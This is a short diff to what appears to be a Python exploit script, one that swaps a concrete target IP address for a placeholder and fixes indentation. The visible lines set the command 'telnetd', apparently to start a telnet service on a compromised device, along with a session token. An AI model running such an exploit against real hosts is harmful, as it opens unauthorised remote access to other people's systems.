@@ -1,4 +1,4 @@
-	# -*- coding:utf-8 -*-
+# -*- coding:utf-8 -*-
 # Acknowledgement
 # Thanks to the partners who discovered the vulnerability together：
 # Wei Xie
@@ -16,7 +16,7 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 import re
 
-url = 'https://142.129.25.139:8090/'
+url = 'https://xxx/'
 print("Exploit continuing...")
 COMMAND = 'telnetd'
 uid = 'r311UuYul4'         ###update it!!!!!
